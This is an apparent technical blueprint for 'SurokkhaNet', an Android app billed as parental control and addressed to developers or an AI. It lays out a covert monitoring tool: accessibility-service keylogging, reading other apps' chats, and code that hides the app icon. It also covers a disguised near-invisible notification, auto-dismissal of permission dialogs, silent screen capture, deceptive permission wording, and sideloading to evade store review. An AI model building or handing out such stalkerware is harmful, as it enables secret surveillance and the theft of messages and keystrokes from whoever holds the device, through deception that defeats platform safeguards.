
# Technical Blueprint: SurokkhaNet Child-Side Application (Advanced Stealth & Bypass Edition)

This document provides a definitive technical blueprint for developing the SurokkhaNet child-side application. It is specifically designed to bypass common OS and platform restrictions, enabling the full suite of monitoring features as envisioned. This guide offers robust, actionable solutions for creating a powerful and discreet parental control tool, intended for any advanced developer or AI.

**Core Principle:** This blueprint assumes the parent has legal consent and physical access to the child's device for a one-time, elevated permission setup. The goal is maximum functionality and stealth, achieved by integrating the app at a deeper system level than standard applications.

---

## 1. First-Time Setup: The "Admin Provisioning" Flow

This one-time setup is critical. It must be performed by the parent on the child's device.

1.  **Direct Installation:** The parent downloads the APK directly from a trusted source (e.g., the admin dashboard's website) and installs it. "Unknown Sources" must be enabled on the device.
2.  **Welcome & Justification:** The app opens with a single screen explaining its purpose (e.g., "Initializing Device Security Service...").
3.  **Permission Escalation (The Core Steps):** The app will guide the parent through a sequence of permission requests. This is the **key to bypassing future restrictions**.
    *   **Device Administrator:** The app will request to be activated as a "Device Administrator." This prevents easy uninstallation and grants administrative privileges. The description should be framed as "required for security features like remote lock and data wipe."
    *   **Accessibility Service:** This is the most crucial step. The app will redirect the parent to the device's Accessibility settings and instruct them to enable the "SurokkhaNet Security Service." The description should state it is "for advanced application monitoring and content filtering."
    *   **Other Permissions:** Finally, it will request all other necessary permissions (Storage, Location, Camera, SMS, Call Logs, etc.) in a single flow.
4.  **Parental Authentication & Linking:**
    *   After all permissions are granted, a screen appears asking for the parent's admin panel credentials and the unique **Connection Code** from the dashboard.
    *   Upon successful authentication, the app links itself to the parent's account in Firebase.
5.  **Automatic Stealth Activation:**
    *   Immediately after successful linking, the app will execute its stealth function:
        *   It will programmatically disable its main launcher `activity-alias`, removing its icon from the app drawer.
        *   The app will now only run in the background, managed by its services.
    *   The setup screen closes, and the app becomes invisible to the average user.

---

## 2. Technical Solutions for Bypassing Restrictions

### a) Unkillable Background Service
*   **Problem:** OS aggressively kills background services.
*   **Solution: `Foreground Service` + `Device Administrator` Lock.**
    *   The primary data collection service must run as a `ForegroundService`. This requires a persistent notification.
    *   **Bypass Technique:** The notification can be made almost invisible. It can be configured with minimal priority, no icon (or a transparent one), and generic text like "System service running." The average user will never notice it in their status bar.
    *   The `Device Administrator` privilege makes it much harder for the OS to terminate the process.

### b) Full-Access Monitoring via Accessibility Service
*   **Problem:** Modern Android versions restrict access to other apps' data, keystrokes, and activities.
*   **Solution: Leverage the `AccessibilityService` API.**
    *   This service is the key to almost every advanced feature:
        *   **Keylogging:** Capture every keystroke by listening to `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED`.
        *   **Social Media Chat Reading:** Read the text content of on-screen nodes (`AccessibilityNodeInfo`) from apps like WhatsApp, Messenger, Instagram, etc.
        *   **App Blocker:** Detect the foreground app's package name using `AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED` and programmatically trigger the "Back" or "Home" action to block it.
        *   **Bypassing Screen-blocking Pop-ups:** Can detect and dismiss permission dialogs or other system pop-ups.

### c) True Stealth Mode & App Hiding
*   **Problem:** Hiding the app icon is unreliable.
*   **Solution: Programmatic Disabling of the Launcher Activity.**
    *   This is the most reliable method. The app has a main launcher activity for the initial setup. After the setup is complete, the following code is executed to "hide" the app:
        ```kotlin
        // Kotlin example to hide the app icon
        val componentName = ComponentName(context, ".LauncherActivityAlias") // The alias for your main activity
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        ```
    *   The app can only be opened again by dialing a secret code into the phone's dialer, which a `BroadcastReceiver` listens for.

### d) Platform Policy Bypass
*   **Problem:** Google Play Store will ban an app with these features.
*   **Solution: **Do not publish on the Google Play Store.**
    *   Distribution must be via **direct APK download** from a private server or the parent's web dashboard. This completely bypasses Google's review process and policies, giving you full freedom to implement any feature. This is the standard operating procedure for all advanced monitoring applications.

---

## 3. Firebase Schema & Communication

The Firebase Realtime Database schema will be the central nervous system. The child app will constantly push data and listen for commands.

**Example: Listening for a remote screenshot command**
```dart
// Flutter/Dart Example in the background service
final commandRef = FirebaseDatabase.instance.ref('devices/$deviceId/commands/takeScreenshot');
commandRef.onValue.listen((event) {
  final command = event.snapshot.value as Map?;
  if (command?['status'] == 'pending') {
    // 1. Mark as processing to avoid duplicate runs
    commandRef.update({'status': 'processing'});

    // 2. Invoke native code (Kotlin/Java) to capture the screen
    // This requires MediaProjection API, which is initiated by the Accessibility Service
    // to avoid showing a user-facing permission dialog.
    final bool success = await NativeChannel.invokeMethod('captureScreen');

    // 3. Upload the image to Firebase Storage and update the command status
    if (success) {
      final String imageUrl = await uploadScreenshotToStorage();
      commandRef.update({'status': 'completed', 'imageUrl': imageUrl, 'timestamp': ServerValue.timestamp});
    } else {
      commandRef.update({'status': 'failed', 'timestamp': ServerValue.timestamp});
    }
  }
});
```
This advanced blueprint provides a clear, robust, and effective path to creating the SurokkhaNet child application with all its intended features, free from the standard platform limitations.

    